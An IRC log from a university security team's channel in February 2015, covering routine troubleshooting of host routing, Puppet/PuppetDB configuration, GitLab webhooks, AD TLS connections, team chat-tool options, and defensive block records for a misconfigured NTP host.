2015-02-12 13:50:43	soehlert	yes that does look strange
2015-02-12 13:50:43	soehlert	i know 126 is some sort of nat ip for the internal but that seems wrong still
2015-02-12 13:51:56	jschipp	instead resolving the desintation host by arp and sending directly to it I believe it's forwarding to the gateway
2015-02-12 13:53:17	soehlert	im trying to think if there was some reason eyrich had set that up. 
2015-02-12 13:54:01	jschipp	how did you test on portal-sec? it doesn't work either
2015-02-12 13:54:14	jschipp	we've had this issue with puppet-sec before in the past
2015-02-12 13:54:16	soehlert	puppet agent -t
2015-02-12 13:54:16	soehlert	what is the error you're seeing
2015-02-12 13:55:27	soehlert	what kind of connection are you trying to make? puppet run or ssh or something else?
2015-02-12 13:55:41	jschipp	it uses the public ip in the case, i'm talking about 10.142.148 routing
2015-02-12 13:55:42	jschipp	[jschipp@portal-sec ~]$ ping -c 1 10.142.148.83
2015-02-12 13:55:42	jschipp	PING 10.142.148.83 (10.142.148.83) 56(84) bytes of data.
2015-02-12 13:55:42	jschipp	From 10.142.148.68 icmp_seq=1 Destination Host Unreachable
2015-02-12 13:56:33	soehlert	ah yes i see. why are you trying to get to the internal ip? i'm not sure why it even has one to be honest.
2015-02-12 13:57:55	jschipp	because nagios always uses the internal ip as a preference from the nrpe_bind_addr script, we're saving a hop by staying on layer 2 when it's available
2015-02-12 13:58:34	soehlert	ok.
2015-02-12 13:58:34	soehlert	im trying to think of a reason we need the internal ip for puppet-sec. anyone got anything? jazoff? eyrich?
2015-02-12 13:59:04	jschipp	i believe you could just fix 10.142.148 routing by removing that route
2015-02-12 13:59:20	soehlert	true, but if it doesnt need an ninternal, might as well remove it
2015-02-12 14:00:47	jschipp	let me know what you do so that I can update nagios appropriately
2015-02-12 14:00:54	soehlert	will do
2015-02-12 14:01:58	eyrich	soehlert: if routing is defined properly then probably not
2015-02-12 14:02:30	eyrich	we might have to poke more holes in the sec firewall
2015-02-12 14:02:50	soehlert	was just going to ask that. I presume that's already in place so this internal ip is redundant. but i wasnt sure
2015-02-12 14:03:25	eyrich	i dont know, i would need to know what traffic from puppet-sec's public IP to internal only hosts is required
2015-02-12 14:45:28	 *	jazoff stabs AD
2015-02-12 14:45:40	jazoff	and SSL..
2015-02-12 14:45:42	soehlert	AD dies
2015-02-12 14:45:50	jazoff	can't get the new BHR stuff to connect to CITES AD using tls
2015-02-12 14:46:12	wraquel	Are you forced down to SSLv3?
2015-02-12 14:46:41	jazoff	i dunno
2015-02-12 14:48:02	jazoff	port 636 is not open, only 389
2015-02-12 14:49:03	wraquel	weird.
2015-02-12 14:49:08	jazoff	I just get
2015-02-12 14:49:08	wraquel	Are you connected via VPN?
2015-02-12 14:49:08	jazoff	ldap.CONNECT_ERROR: {'info': 'A TLS packet with unexpected length was received.', 'desc': 'Connect error'}
2015-02-12 14:49:30	soehlert	have you tried giving it a packet with an expected length? :)
2015-02-12 14:50:36	eyrich	lol
2015-02-12 14:52:14	jazoff	other way around :)
2015-02-12 15:58:24	jazoff	well, I tried to test program on portal-sec and it can connect to cites AD
2015-02-12 15:58:44	jazoff	so it's something with libldap compiled against gnutls in debian
2015-02-12 15:58:47	jazoff	which is not fun
2015-02-12 16:27:39	jschipp	is the git pull cron job not working on puppet-sec because of gitlab?
2015-02-12 16:30:30	jazoff	it's not a cron job.. it uses a webhook.. which is probably broken still
2015-02-12 16:31:04	jazoff	curl localhost:9000 will trigger a run.. i just ran it
2015-02-12 16:40:10	jschipp	kk
2015-02-12 16:40:25	jschipp	I haven't figured out what the problem is yet :/
2015-02-12 16:41:13	jazoff	looks like the background job thing isn't running
2015-02-12 16:41:19	jazoff	what does gitlab use? resque?
2015-02-12 16:41:47	jschipp	status shows all things running and so does the gitlabs check program, everythings gets an OK
2015-02-12 16:42:15	jazoff	odd
2015-02-12 16:42:33	jschipp	redis
2015-02-12 16:42:52	jschipp	and sidekiq
2015-02-12 16:43:20	jazoff	my guess is something with that
2015-02-12 16:43:35	jazoff	since git push should both send the webhook and update the UI
2015-02-12 16:43:44	jazoff	i'm guessing they cache the UI since it only changes on commit
2015-02-12 16:44:36	jschipp	everything looks good in the log files as well
2015-02-12 16:45:31	jazoff	odd
2015-02-12 16:45:34	jazoff	it just isn't... doing it
2015-02-12 16:46:46	jschipp	lol yerp
2015-02-12 16:50:47	jazoff	https://sdelements.github.io/lets-chat/
2015-02-12 16:50:56	jazoff	neat.. except for the mongodb usage :)
2015-02-12 16:51:22	soehlert	whats the issue with mongodb (genuine question)
2015-02-12 16:52:09	jazoff	it's always been kind of half baked
2015-02-12 16:53:25	soehlert	lots of bugs? or just missing features?
2015-02-12 16:54:34	jazoff	bugs, features that didnt actually work right
2015-02-12 16:54:58	soehlert	haha i like that it calls out hubot friendly
2015-02-12 16:55:05	jazoff	yeah
2015-02-12 16:55:32	soehlert	i presume you would see it as a replacement for IRC
2015-02-12 16:55:33	jazoff	theres a lot of things that would work better with a graphical chat client
2015-02-12 16:55:48	jazoff	like being able to show graphs right in the chat and things like that
2015-02-12 16:56:35	jazoff	yeah, irc is nice in that the protocol is so simple and lots of things support it, but it has a lot of limitations
2015-02-12 16:56:50	soehlert	i ran into this one the other day. havent' had a chacne to really look at it: https://slack.com/
2015-02-12 16:56:55	jazoff	it is kinda annoying that there are so many new 'group chat' sites out there and no standardization
2015-02-12 16:56:58	jazoff	yep
2015-02-12 16:57:11	soehlert	the amount of integrations in slack is absurd
2015-02-12 16:57:36	soehlert	including hubot and jira
2015-02-12 16:57:42	soehlert	and nagios
2015-02-12 16:59:09	jschipp	I moved one of my clients to Slack, haven't looked at the integrations though
2015-02-12 16:59:21	soehlert	is it hosted or do you host it?
2015-02-12 16:59:45	jschipp	they host it
2015-02-12 16:59:53	jschipp	web based
2015-02-12 17:00:11	jschipp	but you can also get an app, OSX has one. It's really nice looking
2015-02-12 17:00:34	soehlert	i saw they had apps for ios and android too
2015-02-12 17:00:35	jazoff	I saw we have a https://hipchat.ncsa.illinois.edu/ now 
2015-02-12 17:00:47	soehlert	i would imagine we don't want to have our chat stuff hosted though
2015-02-12 17:01:00	jschipp	yeah, that's a crapton of integrations
2015-02-12 17:01:02	jazoff	which has similar stuff https://www.hipchat.com/integrations
2015-02-12 17:01:52	jschipp	when I start looking at modern chat implentations more and more I'm like meh to IRC
2015-02-12 17:02:11	soehlert	i kinda had that upon first look at slack. 
2015-02-12 17:02:20	soehlert	didnt realize it was such a burgeoning market
2015-02-12 17:02:28	soehlert	makes sense though
2015-02-12 17:02:40	soehlert	instead of rebuilding IRC should i look into one of these?
2015-02-12 17:03:18	jschipp	I would be interested in it, see what everyone else says
2015-02-12 17:03:49	soehlert	sounds like the three of us are intrigued. i'll see what wraquel says tomorrow. it wont be done this week anyways
2015-02-12 17:04:24	jazoff	yeah, the nice thing about irc is that it is a stupid simple server that doesnt require a database or a web server or anything like that
2015-02-12 17:04:33	jazoff	you saw all the fun we had trying to fix openfire when it went broke
2015-02-12 17:04:42	soehlert	thats true
2015-02-12 17:05:22	soehlert	though building this ngircd hasn't been super easy and unrealircd is amassive PITA too..
2015-02-12 17:05:55	jazoff	oh? what's wrong with ngircd?
2015-02-12 17:06:09	jazoff	i built it on my laptop to test without any problems, so i cant imagine linux was harder
2015-02-12 17:06:16	soehlert	building a package i mean
2015-02-12 17:06:19	jazoff	ooh
2015-02-12 17:06:30	soehlert	just building it by hand, no is not hard
2015-02-12 17:06:43	soehlert	i also hvent had the time to really give it full attention and its falling down the list again..
2015-02-12 17:06:54	jazoff	oh
2015-02-12 17:07:03	jazoff	if you commit what you have to the packages repo I can take a look at it
2015-02-12 17:07:38	soehlert	i have nothing worthwhile. i built a package and yum localinstall and there were no files for ngircd on the vagrant box haha. dunno how that happened
2015-02-12 17:08:00	soehlert	crashplan/ossec are going to be my near term future though so if you get bored you can take a peak at ngircd for sure
2015-02-12 17:08:06	soehlert	or whatever chat/irc
2015-02-12 17:09:14	jazoff	ah.. commit it anyway
2015-02-12 17:09:28	jazoff	sounds like you're just an option or two away from being done
2015-02-12 17:09:59	soehlert	actually i don't have anything with packages. i realize what you mean by that now. i have an rpm i built with fpm but thats it. not a build script or anything
2015-02-12 17:11:56	soehlert	i can give you the dir i had where i was making changes to the conf if you want that i spose
2015-02-12 17:13:40	jazoff	oh, the conf file would end up in puppet anyway
2015-02-12 17:13:45	jazoff	so I'll just work on the package
2015-02-12 17:40:50	soehlert	yah i figured, i just wanted to build it once like that to feel lik i had the config options right. idk doesn't make much sense in hindsight.
2015-02-12 19:35:05	jazoff	I added a cron job on puppet-sec to hit autopull every 10 minutes
2015-02-12 19:52:58	jazoff	soehlert: face palm.. ngircd is in EPEL
2015-02-12 21:11:12	wraquel	soehlert: I'm intrigued.
2015-02-13 09:48:16	jschipp	wfh today, going to take the gf out for lunch
2015-02-13 09:54:35	jschipp	Bro Top https://github.com/mephux/brotop
2015-02-13 09:55:10	jschipp	having mephux on the show Monday to talk about intel.criticalstack.com and Bro Top
2015-02-13 09:56:10	jazoff	jschipp: any idea why dns isn't working on brototype?
2015-02-13 09:56:16	jazoff	looks like dnsmasq is broke
2015-02-13 09:56:56	jschipp	nope, did this just happen?  I haven't done anything on it in a while, moved my stuff over to ec2 for testing
2015-02-13 09:57:22	jschipp	I don't need dnsmasq and if you are not using then we can remove it
2015-02-13 09:58:16	jazoff	i dont mind it.. just not sure why it's refusing dns queries
2015-02-13 10:02:23	jazoff	eh, sorta fixed it for now
2015-02-13 10:02:29	jazoff	sudo cp /etc/resolv.dnsmasq.conf /var/run/dnsmasq/resolv.conf
2015-02-13 10:02:36	jazoff	the one in /var/run was empty
2015-02-13 10:08:32	jschipp	ah, kk, thx
2015-02-13 10:08:54	jschipp	jazoff: have you used snf-image with ganeti?
2015-02-13 10:09:21	jazoff	never heard of it
2015-02-13 10:10:48	jschipp	you don't have to mess around with installing a bootloader and the like with the hooks, it pulls in complete images
2015-02-13 10:11:54	jazoff	ah
2015-02-13 10:11:57	jazoff	i only every ran debian
2015-02-13 10:12:22	jschipp	debian worked for me but the grub hook doesn't work with ubuntu and thus all the problems I've been having
2015-02-13 10:12:31	jschipp	I patched it though and it's kinda working now
2015-02-13 10:13:01	jschipp	3+ weeks of my life :(
2015-02-13 10:13:12	jschipp	never got it working with Xen
2015-02-13 10:13:30	jschipp	I may try again though after I get all the stuff with KVM worked out
2015-02-13 10:15:38	jazoff	oh well actually the last time I ran it i ran ubuntu on ubuntu using kvm
2015-02-13 10:15:42	jazoff	no problems there...
2015-02-13 10:25:18	jschipp	yeah, but I need redundancy with drbd
2015-02-13 10:25:26	jazoff	why but?
2015-02-13 10:25:36	jazoff	I used drbd
2015-02-13 10:25:48	jschipp	directly with kvm?
2015-02-13 10:26:06	jazoff	ganeti runs drbd and kvm runs on top of it
2015-02-13 10:26:56	jazoff	fun.. so I did some testing using docker.. debian will not connect to cites AD.. likely because of gnutls
2015-02-13 10:26:58	jschipp	right, I thought you were saying that ubuntu with kvm just works
2015-02-13 10:27:00	jazoff	centos works fine
2015-02-13 10:27:19	jschipp	which is true but I'm saying I can't do that because I need the drbd feature unless you can do it with ganeti easily
2015-02-13 10:27:22	jazoff	no i mean, I ran geneti on ubuntu and ran ubuntu vms and it worked
2015-02-13 10:27:31	jschipp	oh
2015-02-13 10:28:04	jschipp	yeah, I'm not having that luck, there a big thread about how the grub scripts were broken as well
2015-02-13 10:28:20	jazoff	well this was 2+ years ago :)
2015-02-13 10:28:25	jazoff	so something might have gone broke
2015-02-13 10:28:38	jschipp	yeah, I believe it's the change with grub2
2015-02-13 10:28:46	jschipp	change to*
2015-02-13 11:31:34	soehlert	jazoff: wait seriously? it's in epel?! It didnt' mention anything about having a RHEL or CentOS package on their site. bah. 
2015-02-13 11:45:10	jazoff	yeah.. I think we would still want to patch it to bump up the command limit setting though
2015-02-13 11:45:56	jazoff	but I can work on that and possibly make it a configuration option and send a patch upstream
2015-02-13 11:46:08	jazoff	it has other options so in theory making that one shouldnt be too hard
2015-02-13 11:52:23	soehlert	ya i didnt see that by default in the config, but that'd be useful
2015-02-13 12:07:34	wraquel	FYI, I'm home with kids today
2015-02-13 12:17:39	jazoff	wraquel: https://git-sec.internal.ncsa.edu/ncsa-security/certmgr/blob/master/certmgr/tests.py
2015-02-13 12:18:24	jazoff	I think I have the core of requests+authorizations working the way it should
2015-02-13 12:26:20	jazoff	wraquel: we doing SPC again this year?
2015-02-13 12:26:31	jazoff	not sure how our travel/training budget thing works
2015-02-13 13:06:02	wraquel	jazoff: I am. I haven't submitted my request yet though.
2015-02-13 13:06:11	wraquel	Are you doing any bro training at SPC?
2015-02-13 13:06:24	wraquel	I'm guessing no since you asked if we're doing SPC.
2015-02-13 13:06:51	wraquel	I need to submit a professional development request for it.
2015-02-13 13:15:47	soehlert	jazoff: something i thought of yesterday that wont work for SF I'm sure, but I've never seen anyone give a talk on puppetizing bro before. That might be a cool topic some time
2015-02-13 13:15:59	jazoff	soehlert: someone gave one at the last brocon :)
2015-02-13 13:16:46	jazoff	https://forge.puppetlabs.com/panaman/bro
2015-02-13 13:16:58	jazoff	i looked at that module but decided to write my own
2015-02-13 13:17:29	jazoff	we needed too much weird stuff to do to support pf_ring and myricom
2015-02-13 13:18:18	jazoff	lloks like he supports myricom and pf_ring now(not sure if it used to) but I'm pretty sure that just tweaks the bro settings
2015-02-13 13:18:25	jazoff	we needed to actually setup pf_ring and myricom
2015-02-13 13:21:21	soehlert	oops haha
2015-02-13 13:21:30	soehlert	well clearly it was a good idea then
2015-02-13 13:24:38	jazoff	:)
2015-02-13 13:46:54	soehlert	good lord telnet via putty is ridiculously involved
2015-02-13 14:28:15	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2015-02-13 14:47:03	jschipp	a/names
2015-02-13 14:47:05	jschipp	err
2015-02-13 15:26:15	jazoff	neat.. messing with the django model signals for kicking off tasks for the ssl thing..
2015-02-13 15:26:49	jazoff	have it working that if someone requests a cert for like example.com and they aren't authorized, adding an authorization for that automatically finds the pending request and auths it
2015-02-13 15:27:14	soehlert	ssl thing?
2015-02-13 15:27:35	jazoff	the incommon api proxy thing I am making
2015-02-13 15:27:43	soehlert	ah gotcha
2015-02-13 15:27:56	jazoff	never really asked why.. but I bet the incommon site doesnt support a fine grained enough workflow
2015-02-13 15:28:17	jazoff	so the auth system i built so far lets you authorize literal certs, prefixes, or regexes
2015-02-13 15:28:29	jazoff	so i could authorize you for request + prefix + '-sec.ncsa.illinois.edu'
2015-02-13 15:28:55	soehlert	ah thats cool
2015-02-13 15:29:52	jazoff	or like, bwbhw[0-9].ncsa.illinois.edu
2015-02-13 15:30:10	soehlert	ah that's gonna be big for clusters. i know thats a pain now
2015-02-13 15:30:16	jazoff	oh yeah!
2015-02-13 15:30:23	jazoff	one of the major features to support is bulk requests
2015-02-13 15:30:34	jazoff	which should really just be a frontend thing once I get the backend done
2015-02-13 15:30:50	soehlert	sounds like you're close on that too
2015-02-13 15:30:58	jazoff	I don't think the backend needs to support bulk requests, it will just handle 10 individual ones
2015-02-13 15:31:09	jazoff	just need the html form to submit them in bulk is all
2015-02-13 15:31:32	jazoff	so the next step since i'm almost there is to build a fake incommon service, since I still can't get their test api to work
2015-02-13 15:31:38	jazoff	probably for the best for now
2015-02-13 15:31:39	soehlert	haha oops
2015-02-13 15:31:59	jazoff	doing it that way will make it easier to test and easier to switch to another api later if needed
2015-02-13 15:32:34	jazoff	so.. just need to build that thing, then some of the frontend stuff, and it should be at least demo-able
2015-02-13 15:33:06	soehlert	sounds like a cool project with a lot of use outside of just our gropu
2015-02-13 15:33:14	jazoff	maybe :)
2015-02-13 15:33:42	jazoff	i was having trouble with the api and couldn't get the project strted, and then i realized it was 90% authorization and workflow and only 5
2015-02-13 15:33:47	jazoff	% ssl api stuff
2015-02-13 15:34:06	jazoff	once i have an object that has the CSR and the required fields, in theory it is just 2 api calls to get the signed cert
2015-02-13 15:34:24	soehlert	thats always the best feeling when you realize how to break down a big project
2015-02-13 15:35:59	jazoff	yeah
2015-02-13 15:36:29	jazoff	the state machine for the workflow is a little tricky, may have to start over there
2015-02-13 15:38:48	jazoff	so far I have Pending Approval -> Authorized -> Queued -> Waiting  -> [Done|Failed]
2015-02-13 15:39:02	jazoff	waiting should probably be 'submitted'
2015-02-13 15:39:09	soehlert	ya submitted sounds better
2015-02-15 22:50:56	soehlert	man this sounds like a kinda cool tool, though it seems like maybe it's mssql only? https://github.com/iSECPartners/sqlperms
2015-02-16 07:38:49	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-02-16 12:37:15	soehlert	eyrich: I swear they asked me for 1950s not 2950s. that being said i have no idea where they are
2015-02-16 12:41:13	wraquel	They were 1950s. I know where they are.
2015-02-16 12:43:04	jschipp	wraquel: are we talking about the systems that you borrowed from me that I borrowed from eyrich?
2015-02-16 12:43:09	wraquel	yep
2015-02-16 12:43:13	wraquel	thems the ones
2015-02-16 12:43:17	jschipp	ah, kk
2015-02-16 12:59:18	jschipp	wraquel: are they in 3003?
2015-02-16 13:04:37	wraquel	jschipp: yes
2015-02-16 13:04:39	wraquel	I found them.
2015-02-16 13:06:22	jschipp	kk
2015-02-16 13:06:42	jschipp	tags need to be transferred
2015-02-16 13:07:00	jschipp	I'll add them to e-mail
2015-02-16 13:08:28	wraquel	I pictures of the tags
2015-02-16 13:09:17	jschipp	oh, kk
2015-02-16 14:26:17	soehlert	heh just had an otp of: 03030303
2015-02-16 14:31:20	jschipp	if I know how to do an ascii smirk I would type it in
2015-02-16 14:31:23	jschipp	knew*
2015-02-16 15:16:53	wraquel	:/
2015-02-16 15:17:12	soehlert	?
2015-02-16 15:17:24	wraquel	that's not a smirk?
2015-02-16 15:21:56	wraquel	\_()_/
2015-02-16 15:22:16	soehlert	ahh not how i see that, but i could be wrong. im not practiced at the art of emoji
2015-02-16 15:28:53	soehlert	can someone get on sects01 and open crashplan desktop? i want to see if the issue is just mine or full system
2015-02-17 08:25:13	eyrich	jazoff: do we get alerts if the phishign block system catches somone?
2015-02-17 08:38:32	wraquel	phishing block system?
2015-02-17 08:39:27	eyrich	ya, we have a table of phishing domains, if bro sees a http (maybe https ?) get to the domain we BHR th eremote IP
2015-02-17 08:48:55	wraquel	ah
2015-02-17 08:49:10	wraquel	right, was thinking we had enabled rpz or something.
2015-02-17 08:49:30	eyrich	if only neteng would enable rpz
2015-02-17 18:04:24	jazoff	eyrich: no alerts.. and it's not enabled to block people yet
2015-02-17 18:04:35	jazoff	it is going to the notice.log on bro-dev, i've been checking up on it, no hits yet
2015-02-17 18:06:23	jazoff	i can enable email alerting, but so far there havent been any hits
2015-02-18 06:54:28	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2015-02-18 07:07:07	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-02-18 10:06:39	<--	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Quit: leaving)
2015-02-18 10:07:48	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2015-02-18 11:04:03	jschipp	is anyone using repo-sec to pull packages into a vagrant box for testing? Is there a proxy or something I can go through? I would like to test my puppet configs with custom packages
2015-02-18 11:09:55	wraquel	I think soehlert and jazoff are in Cali for bros for pros
2015-02-18 11:12:36	jschipp	ah
2015-02-18 11:17:27	jschipp	eyrich: did anything change with regards to the reaching puppet-sec from the private network? My private machines like git-sec and thruk can't reach the server
2015-02-18 11:20:40	jazoff	jschipp: sort of.. need to fi the puppet config
2015-02-18 11:21:15	jschipp	[jschipp@git-sec ~]$ ping -c 1 -W 1 141.142.148.83
2015-02-18 11:21:16	jschipp	PING 141.142.148.83 (141.142.148.83) 56(84) bytes of data.
2015-02-18 11:21:16	jschipp	--- 141.142.148.83 ping statistics ---
2015-02-18 11:21:16	jschipp	1 packets transmitted, 0 received, 100% packet loss, time 1000ms
2015-02-18 11:21:24	jazoff	edit /etc/puppetlabs/puppet/puppet.conf
2015-02-18 11:21:29	jazoff	make sure server name is just puppet-sec
2015-02-18 11:21:36	jazoff	not puppet-sec.ncsa.illinois.edu
2015-02-18 11:22:49	jschipp	kk, I tried puppet-sec.internal..., but this one works - thanks
2015-02-18 11:23:19	jschipp	so all the private net only hosts are broken now I suspect?
2015-02-18 11:23:22	jazoff	yeah, it needs to use puppet-sec.internal, but etc/resolv.conf will handle that
2015-02-18 11:23:29	jazoff	so just using puppet-sec will work on all machines
2015-02-18 11:24:15	jschipp	hmm, some of it applied but also got this
2015-02-18 11:24:16	jschipp	Error: /Stage[main]/Nagios::Nrpe_install/File[/usr/local/nagios/etc/nrpe.cfg]/content: change from {md5}ce95f10f972e070eec3b82ae3a60505d to {md5}6a791541b942e39cc4c65822ae7d9f20 failed: Could n
2015-02-18 11:24:19	jschipp	ot back up /usr/local/nagios/etc/nrpe.cfg: Connection timed out - connect(2)
2015-02-18 11:24:40	jazoff	what did it fail to connect to?
2015-02-18 11:24:58	jschipp	one sec, let me rerun with debug
2015-02-18 11:27:54	jschipp	hmmm, it doesn't say
2015-02-18 11:29:42	jazoff	could be the fileserver config...
2015-02-18 11:29:43	jazoff	the puppet file host may be set to the fqdn too
2015-02-18 11:30:13	jschipp	tcp        0      1 10.142.148.69:58565         141.142.148.83:8140         SYN_SENT
2015-02-18 11:30:27	jazoff	yeah
2015-02-18 11:30:29	jschipp	trying the public addr
2015-02-18 11:30:40	jschipp	what's the fileserver config?
2015-02-18 11:30:47	jschipp	or where I should ask
2015-02-18 11:30:50	jazoff	just another setting in puppet
2015-02-18 11:31:01	jazoff	on puppet-sec in /etc/puppet* somewhere
2015-02-18 11:31:05	jazoff	just do
2015-02-18 11:31:06	jschipp	ah
2015-02-18 11:31:14	jazoff	grep -r puppet-sec.ncsa /etc/puppet
2015-02-18 11:31:17	jazoff	on puppet-sec
2015-02-18 11:31:43	jazoff	change any puppet-sec.ncsa.illinois.edu to just puppet-sec
2015-02-18 11:34:54	jschipp	did that, Error: Could not retrieve catalog from remote server: Error 400 on SERVER: Failed to submit 'replace facts' command for git-sec.internal.ncsa.edu to PuppetDB at puppet-sec:8081: Connection refused - connect(2)
2015-02-18 11:35:50	jschipp	tcp        0      0 ::ffff:141.142.148.83:8081  :::*                        LISTEN      1826/java  
2015-02-18 11:35:57	jschipp	it's only listening on public address
2015-02-18 11:36:46	jschipp	well, hmmm, how do you restart the puppet daemon?
2015-02-18 11:37:53	jschipp	found it, that didn't do it.
2015-02-18 11:38:48	jazoff	oh, that's puppetdb, that's something else
2015-02-18 11:39:05	jazoff	but probably slightly broken too
2015-02-18 11:39:09	jschipp	ah, grabbed the wrong port
2015-02-18 11:39:38	jschipp	tcp        0      0 :::8140                     :::*                        LISTEN      2243/pe-httpd.worke 
2015-02-18 11:39:49	jschipp	lisetning all the all address
2015-02-18 11:39:53	jschipp	on the*
2015-02-18 11:40:04	jazoff	yeah, that compnent is fine
2015-02-18 11:40:20	jazoff	but there is likely a setting that is telling the client to use puppet-sec.ncsa for files
2015-02-18 11:40:32	jazoff	i can't ssh to puppet-sec for some reason though so I cant see 
2015-02-18 11:40:49	jazoff	ah, there it goes
2015-02-18 11:40:59	jschipp	should all the certname stuff be set to puppet-sec too?
2015-02-18 11:41:14	jschipp	I figure that would break it
2015-02-18 11:41:18	jazoff	it might
2015-02-18 11:42:16	jazoff	did you change archive_file_server ? that would have been it
2015-02-18 11:42:20	jschipp	PuppetDB at puppet-sec:8081: Connection refused - connect(2)
2015-02-18 11:42:53	jazoff	hmm
2015-02-18 11:43:25	jazoff	/etc/puppetlabs/puppetdb/conf.d/jetty.ini
2015-02-18 11:43:35	jazoff	ssl-host = puppet-sec.ncsa.illinois.edu
2015-02-18 11:43:41	jazoff	that needs to be ssl-host = 0.0.0.0
2015-02-18 11:44:32	jazoff	tweak that and restat puppetdb, should fix that issue
2015-02-18 11:44:41	jazoff	dual homed hosts = always fun :)
2015-02-18 11:45:18	eyrich	jazoff: ya - wondering if we should start moving away from dual homed except for the bastions
2015-02-18 11:46:44	jschipp	bingo tcp        0      0 :::8081                     :::*                        LISTEN      16628/java 
2015-02-18 11:48:43	jazoff	it might simplify some things, that's for sure
2015-02-18 11:50:11	jschipp	hmmm, I think it's going to time out again 
2015-02-18 11:50:32	jazoff	it may still be pointing to the wrong hostname
2015-02-18 11:53:07	jschipp	btw, while I have you hear have you tried using repo-sec from a vagrant box to test custom packages/puppet run? do you kown if there's an http proxy?
2015-02-18 11:53:27	jazoff	nope.. have not tried
2015-02-18 11:54:22	jschipp	kk
2015-02-18 11:54:52	jschipp	it wonder if we can allow from the VPN or something, otherwise testing your entire config is a PITA
2015-02-18 11:55:55	jschipp	I suppose a port forward would work too
2015-02-18 12:01:45	eyrich	bottle loft: http://www.scamstuff.com/products/bottleloft?mc_cid=f9522b56cf&mc_eid=1267fa5648
2015-02-18 12:12:34	jschipp	with that domain that's not what I thought that was going to be
2015-02-18 12:29:05	soehlert	eyrich: did you see the ossec windows event log notifications? i thought that was cool. i did not know it was doing that.
2015-02-18 12:31:31	soehlert	also, I noticed a few alerts going to security-alerts that should probably be going to security-admin. the sec-lb ones and the veeam backup ones in particular.
2015-02-18 12:45:33	eyrich	soehlert: i didnt
2015-02-18 12:51:09	soehlert	they were alerting on you uninstalling/reinstalling crashplan and changing GPO
2015-02-18 13:01:15	eyrich	veeam changed to secueity-admin
2015-02-18 13:12:48	soehlert	perfect thanks
2015-02-18 13:12:58	eyrich	all 8 firewalls now sending mail to security-admin
2015-02-18 15:31:06	jschipp	I hate that the upstart provider is not supported on CentOS in puppet's service type
2015-02-18 16:05:17	jazoff	jschipp: you can make it work though...
2015-02-18 16:06:13	jazoff	yeah.. I think you figured that out too :)
2015-02-18 16:06:42	jazoff	it's actually easy enough for us to define an upstart_service that just defines all the options that make it work
2015-02-18 16:24:58	jschipp	yeah
2015-02-18 17:01:35	jazoff	ninfo bhlist 141.142.160.60
2015-02-18 17:01:36	ncsabot	Empty Result
2015-02-18 17:01:54	jazoff	ninfo bhr_history 141.142.160.60
2015-02-18 17:01:54	ncsabot	Error running plugin
2015-02-18 17:01:59	jazoff	>.<
2015-02-18 17:02:58	jazoff	ninfo bhrhistory 141.142.160.60
2015-02-18 17:04:00	ncsabot	<14>Feb 18 12:16:43 cygnus BHR_UNBLOCK: IP=141.142.160.60 WHO=ntp conf fixed by admin WHY="eyrich"
2015-02-18 17:04:00	ncsabot	<14>Feb 17 18:13:35 cygnus BHR_BLOCK: IP=141.142.160.60 HOSTNAME=gpfsftp1.ncsa.illinois.edu WHO=eyrich WHY="used for NTP amplification" UNTIL=1426810415 DURATION=2592000
2015-02-18 17:04:00	ncsabot	<14>Feb  9 12:15:24 cygnus BHR_UNBLOCK: IP=141.142.160.60 WHO=ntp fixed WHY="eyrich"
2015-02-18 17:04:45	jazoff	ah, ok, that makes sense
2015-02-18 17:04:58	jazoff	was trying to figure out if it actually was a problem again or if I was just getting old emails
2015-02-19 06:36:55	eyrich	who and why are reversed
2015-02-19 08:46:39	wraquel	So, brotestbed is flooding campus mail servers with emails to fail2ban@example.com
2015-02-19 10:05:00	eyrich	"delete old emails to minimize your risk of data loss"
2015-02-19 10:06:06	eyrich	more like oh shit we didnt expect to need this much storage for email - maybe they should change their minds on google for faculty/staff - google wants me to NOT delete my old messages
2015-02-19 10:07:19	wraquel	more data makes for better profiling.
2015-02-19 10:07:22	wraquel	:D
2015-02-19 10:08:16	eyrich	i know
2015-02-19 10:28:04	--	irc: disconnected from server
2015-02-19 10:28:15	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-19 10:28:15	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-19 10:28:27	--	Mode #security [+]
2015-02-19 10:28:27	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-19 10:56:42	jschipp	is there a hold on thruk? the nagios-sec interface still works. puppet is still not accesible from thruk or any of the private only machines so pulling down my changes isn't going to work
2015-02-19 10:57:44	wraquel	so nagios-sec can't get to puppet-sec 8081?
2015-02-19 10:58:20	jschipp	no, nagios-sec isn't a private only machine but git-sec, nagios-console-sec (aka thruk), etc cannot
2015-02-19 10:59:25	jschipp	nagios-sec works which is what Terry has been using
2015-02-19 10:59:38	wraquel	I get a 500 error
2015-02-19 10:59:43	wraquel	What's the thruk link?
2015-02-19 11:00:02	wraquel	found it in poral-sec
2015-02-19 11:00:03	wraquel	I get a 500 error
2015-02-19 11:00:08	wraquel	https://nagios-console-sec.internal.ncsa.edu/thruk/
2015-02-19 11:00:28	jschipp	yes, I know I looked it yesterday
2015-02-19 11:00:43	jschipp	I'm not sure what's causing it
2015-02-19 11:01:30	jschipp	it's state with puppet seems to show more of the catalog needs to be applied so I wanted to wait for that since the nagios-sec interface still works
2015-02-19 11:01:33	jschipp	its*
2015-02-19 11:02:11	jazoff	the fcgi daemon is not running
2015-02-19 11:02:12	jazoff	[root@nagios-console-sec httpd]# /etc/init.d/thruk status
2015-02-19 11:02:12	jazoff	thruk is not running
2015-02-19 11:02:24	wraquel	Ok, so the nagios interface worrks, but thruk is not.
2015-02-19 11:03:16	jschipp	correct
2015-02-19 11:03:37	wraquel	And you're not sure why thruk isn't working.
2015-02-19 11:04:25	jazoff	ah, i see why puppet is not working
2015-02-19 11:04:29	jazoff	it has the wrong resolve.conf
2015-02-19 11:04:48	wraquel	nagios-sec is pointing to local unbound.
2015-02-19 11:05:01	jazoff	on nagios-console-sec i mean
2015-02-19 11:05:08	jschipp	yeah, I haven't touched it so I don't why its state is changed. It's always been that way
2015-02-19 11:05:15	jazoff	private machines need to be search internal.ncsa.edu ncsa.illinois.edu
